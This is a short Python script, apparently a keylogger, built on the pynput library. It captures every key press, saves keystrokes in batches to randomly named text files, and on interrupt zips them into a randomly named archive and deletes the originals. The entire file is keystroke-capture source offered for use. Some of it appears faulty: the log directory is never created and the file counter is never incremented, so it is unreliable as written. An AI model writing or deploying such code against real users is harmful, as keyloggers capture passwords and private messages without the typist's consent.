from pynput.keyboard import Key
from pynput.keyboard import Listener
from random import choices
from string import ascii_lowercase
from tqdm import tqdm
import os
import zipfile

FILE_CHAR_LIM = 10


class Logger:
    def __init__(self):
        self.__captured = list()
        self.__prog = tqdm(total=FILE_CHAR_LIM)
        self.__num_files = 0
        self.__dir_name = "".join(choices(ascii_lowercase, k=16))
        print("Generated 0 files. Press (CTRL-C) to stop capture\nProgress to next file:")

    def start(self):
        try:
            with Listener(on_press=self._key_event_press) as the_listener:
                the_listener.join()
        except KeyboardInterrupt:
            self._store_data()
            name = ''.join(choices(ascii_lowercase, k=16))
            zf = zipfile.ZipFile(f"{name}.zip", "w")
            for dirname, subdirs, files in os.walk(self.__dir_name):
                for filename in files:
                    if '.txt' in filename:
                        zf.write(os.path.join(dirname, filename))
            zf.close()
            for root, dirs, files in os.walk(self.__dir_name):
                for name in files:
                    os.remove(os.path.join(root, name))
            os.rmdir(self.__dir_name)


    def _key_event_press(self, key):
        print(key)
        if key == Key.space:
            self.__captured.append(" ")
        else:
            self.__prog.update(1)
            self.__captured.append(key)
        if len(self.__captured) >= FILE_CHAR_LIM:
            self._store_data()

    def _store_data(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        with open(f'{self.__dir_name}/{"".join(choices(ascii_lowercase, k=16))}.txt', 'w') as log:
            for the_key in self.__captured:
                the_key = str(the_key).replace("'", "")
                log.write(the_key)
        self.__captured = list()
        self.__prog = tqdm(total=FILE_CHAR_LIM)
        print(f"Generated {self.__num_files} files. Press (CTRL-C) to stop capture\nProgress to next file:")


l = Logger()
l.start()
